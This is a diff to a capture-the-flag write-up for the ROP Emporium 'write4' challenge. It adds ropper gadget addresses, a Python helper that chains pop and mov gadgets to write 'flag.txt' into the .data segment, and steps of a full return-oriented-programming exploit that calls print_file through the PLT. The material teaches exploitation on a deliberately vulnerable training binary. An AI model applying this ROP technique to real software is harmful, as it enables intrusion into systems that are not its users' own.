@@ -63,11 +63,13 @@ $ ropper -f write4 | grep mov
 ```
 Both of these gadgets could be used for this challenge. We will use the one at `0x400629`, but the other one would have arguably been better as it allows for writing 64 bits instead of 32.
 With this gadget, we can write to a pointer in `rsi` with the contents of `rdi/edi`. We will thus also need gadgets to fill `rsi` and `rdi/edi`.
-...
-
-
-
-We can write a function to write 4 bytes to a writable address using these gadgets as follows:
+Using ropper we can again find gadgets for those as well:
+```
+0x0000000000400691: pop rsi; pop r15; ret;
+0x0000000000400693: pop rdi; ret;
+```
+Note that our gadget for `rsi` also pops to `r15`. This means we will also need to provide some garbage value that will go into `r15`.
+We can now write a function to write 4 bytes to a writable address using these gadgets as follows:
 ```
 def write4bytes(writable_address, bytestr):
     pop_rsi_r15_gadget = 0x400691
@@ -82,8 +84,30 @@ def write4bytes(writable_address, bytestr):
     payload += p64(write_mov_gadget)   # Trigger write
     return payload
 ```
+We can use this function to write `flag.txt` to our writable address as follows (note that it also seem to work without supplying the null bytes):
+```
+writable_address = 0x601028 # in .data segment
 
+# Stage 1, write "flag.txt" to writable_address
+payload += write4bytes(writable_address  , b"flag")
+payload += write4bytes(writable_address+4, b".txt")
+payload += write4bytes(writable_address+8, b"\x00\x00\x00\x00") # Seems unnecessary for working exploit
+```
 
+## Write the memory address to `rdi`
+To put the address of our written string into `rdi`, we can reuse the same gadget from before.
+```
+payload += p64(pop_rdi_gadget)
+payload += p64(writable_address)
+```
+
+## Call `print_file()`
+As the final step of our exploit, we simply need to call `print_file()`. We can do this by reusing the PLT trampoline trick from the previous challenge; taking the jump in the PLT to the function:
+```
+print_file_plt = 0x400510
+payload += p64(print_file_plt)
+```
+The script for the complete exploit is thus as follows:
 
 ```
 #!/usr/bin/env python3
@@ -157,7 +181,7 @@ payload = b"A" * 40
 # Stage 1, write "flag.txt" to writable_address
 payload += write4bytes(writable_address  , b"flag")
 payload += write4bytes(writable_address+4, b".txt")
-#payload += write4bytes(writable_address+8, b"\x00\x00\x00\x00") # Seems unnecessary
+payload += write4bytes(writable_address+8, b"\x00\x00\x00\x00") # Seems unnecessary for working exploit
 
 # Stage 2, put writable_address in rdi and call print_file()
 payload += p64(pop_rdi_gadget)
